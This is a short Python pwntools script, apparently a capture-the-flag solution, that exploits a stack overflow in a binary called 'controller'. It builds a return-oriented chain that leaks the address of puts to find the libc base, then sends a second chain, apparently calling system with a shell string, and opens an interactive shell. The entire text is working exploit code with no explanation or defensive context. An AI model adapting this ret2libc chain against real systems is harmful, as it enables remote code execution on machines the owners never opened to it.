from pwn import *

#r = process(['./controller'])
r = remote(...)
elf = ELF("./controller")
POP_RDI = 0x00000000004011d3

r.sendline("-182\n-359\n3")

BASE = b"aaaabbbbccccddddeeeeffffggggaaaabbbbcccc"
payload = BASE + p64(POP_RDI) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00401066)

r.sendline(payload)
leak = r.recvuntil(b"\x7f", timeout=5).split(b"\n")[-1]
leak = u64(leak.ljust(8, b"\x00"))
leak -= 0x0000000000080aa0
log.info("Libc @ 0x%x" % leak)

r.sendline("-182\n-359\n3")
r.sendline(BASE + p64(0x0000000000400606) + p64(POP_RDI) + p64(leak+0x1b3e1a) + p64(leak+0x04f550))

r.interactive()
